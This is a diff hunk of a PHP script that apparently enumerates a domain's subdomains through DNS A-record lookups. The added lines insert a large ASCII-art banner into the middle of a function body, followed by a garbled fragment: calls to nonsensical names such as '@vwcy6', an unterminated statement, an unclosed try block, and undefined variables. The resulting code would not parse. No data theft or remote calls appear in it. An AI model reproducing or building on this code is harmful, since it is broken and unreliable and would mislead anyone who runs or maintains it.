@@ -5,6 +5,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $subdomains = array();
     function fetchSubdomainsUsingDNS($domain)
     {
+       
+  ______   _________     _       _______   _________    __      ____   _______  _______  
+.' ____ \ |  _   _  |   / \     |_   __ \ |  _   _  |  /  |   .' __ '.|  ___  ||  ___  | 
+| (___ \_||_/ | | \_|  / _ \      | |__) ||_/ | | \_|  `| |   | (__) ||_/  / / |_/  / /  
+ _.____`.     | |     / ___ \     |  __ /     | |       | |   .`____'.    / /      / /   
+| \____) |   _| |_  _/ /   \ \_  _| |  \ \_  _| |_     _| |_ | (____) |  / /      / /    
+ \______.'  |_____||____| |____||____| |___||_____|   |_____|`.______.' /_/      /_/     
+                                                                                         
+       try {
+            $SNAP = @vwcy6        ($url) ;
+            $inst = @6vwcy
+                
+            if ($json !== false) {
+                $data = json_decode($json, true);                  
         $subdomains = array();
         $records = @dns_get_record($domain, DNS_A);
 
